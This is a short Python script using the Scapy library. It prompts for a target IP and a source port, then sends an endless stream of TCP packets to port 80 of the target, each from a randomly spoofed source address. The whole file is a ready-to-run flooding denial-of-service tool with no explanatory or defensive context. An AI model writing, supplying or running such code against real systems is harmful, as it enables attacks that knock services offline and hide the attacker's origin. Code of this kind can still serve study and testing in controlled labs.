from __future__ import print_function
import random, sys
from scapy.all import *

if sys.version_info < (3,0):
  input = raw_input

target = input('Enter The Target IP:\t')
srcport = int(input('Enter Source Port:\t'))

i = 1
while True:
  try:
    a = str(random.randint(1, 254))
    b = str(random.randint(1, 254))
    c = str(random.randint(1, 254))
    d = str(random.randint(1, 254))
    dot = '.'
    src = a + dot + b + dot + c + dot +d
    print(src)
    IP1 = IP(src=src, dst=target)
    TCP1 = TCP(sport=srcport, dport=80)
    pkt = IP1 / TCP1
    send(pkt,inter=.001)
    print('Sent Packet', i)
    i = i + 1
  except KeyboardInterrupt:
    break